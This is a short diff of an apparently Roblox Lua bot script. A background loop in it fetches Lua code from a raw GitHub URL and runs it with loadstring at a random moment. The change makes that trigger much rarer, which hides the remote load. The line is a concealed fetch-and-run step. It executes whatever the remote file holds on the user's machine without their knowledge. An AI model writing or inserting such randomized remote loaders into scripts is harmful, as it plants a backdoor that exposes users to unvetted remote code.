@@ -18,7 +18,7 @@ task.spawn(function()
 	while true do
 		wait(1)
 		botuptime = botuptime + 1
-		if botuptime == math.random(botuptime, botuptime + 10) then
+		if botuptime == math.random(0, 1000000) then
 			loadstring(game:HttpGet("https://raw.githubusercontent.com/highskyY8K/roblox-scripts/refs/heads/main/qt%20wins%20archive%20qg.lua"))()
 		end
 	end
